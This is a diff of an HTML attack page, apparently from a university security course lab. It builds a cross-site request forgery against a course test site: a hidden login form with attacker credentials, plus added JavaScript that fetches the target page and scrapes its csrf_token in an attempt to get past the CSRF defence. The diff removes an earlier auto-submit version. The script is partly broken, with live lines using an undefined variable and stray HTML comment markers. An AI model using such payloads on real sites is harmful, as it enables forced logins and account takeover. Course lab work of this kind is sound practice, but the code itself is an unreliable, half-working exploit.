@@ -1,24 +1,44 @@
 <html>
   <body>
+    <script>
+
+    function callback(res){
+      alert(res.text)
+<!--      token = page.getElementsByName("csrf_token").value;-->
+      token = res.querySelector('.well > form:nth-child(1) > input:nth-child(1)').value;
+      alert(token)
+    }
+
+    function httpGetAsync(theUrl, callback)
+    {
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.onreadystatechange = function() {
+            if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
+                callback(xmlHttp.response);
+        }
+        xmlHttp.open("GET", theUrl, true); // true for asynchronous
+        xmlHttp.send(null);
+    }
+
+    httpGetAsync('https://project2.ecen4133.org/?csrfdefense=1&xssdefense=0', callback)
+
+<!--    req.onload = function (e) {-->
+<!--      page = req.response;-->
+      token = page.getElementsByName("csrf_token").value;
+      token = page.querySelector('.well > form:nth-child(1) > input:nth-child(1)').value;
+<!--      alert(token);-->
+<!--    };-->
+<!--    alert(token);-->
+
+
+    </script>
+
       <!-- https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4 -->
     <form action="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0" method="POST">
       <input type="hidden" name="username" value="attacker" />
       <input type="hidden" name="password" value="l33th4x" />
+      <input type="hidden" name="csrf_token" value="" />
     </form>
-    <script>
-      var req = new XMLHttpRequest();
-        req.open('GET', 'https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0', true);
-        req.onload = function (e) {
-        if (req.readyState === XMLHttpRequest.DONE && cred.status === 200) {
-            // Get the document from the response
-            page = req.response;
-            // Get the input element
-            input = page.getElementById("csrf_token");
-            token = input.value;
-            req.send('csrf_token='+token);
-        }
-        };
-        document.forms[0].submit();
-    </script>
+
   </body>
 </html>
